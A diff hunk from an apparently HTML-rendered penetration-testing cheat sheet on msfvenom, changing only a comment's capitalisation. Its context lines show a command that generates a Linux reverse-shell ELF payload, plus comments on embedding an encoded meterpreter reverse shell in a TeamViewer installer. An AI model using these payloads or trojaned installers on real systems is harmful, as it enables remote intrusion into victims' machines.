@@ -76,7 +76,7 @@ msfvenom <span class="nt">-p</span> linux/x64/shell/reverse_tcp <span class="nt"
 <span class="c"># generate a stageless reverse TCP payload in elf format for linux x64 systems (remove null byte bad char)</span>
 msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
 
-<span class="c"># generate a stageless meterpreter reverse TCP payload for a Windows x86 target,</span>
+<span class="c"># generate a stageless meterpreter reverse TCP payload for a windows x86 target,</span>
 <span class="c"># embed it in a TeamViewer_Setup.exe executable file,</span>
 <span class="c"># encode the payload 5 times with shikata_ga_nai,</span>
 <span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread.</span>
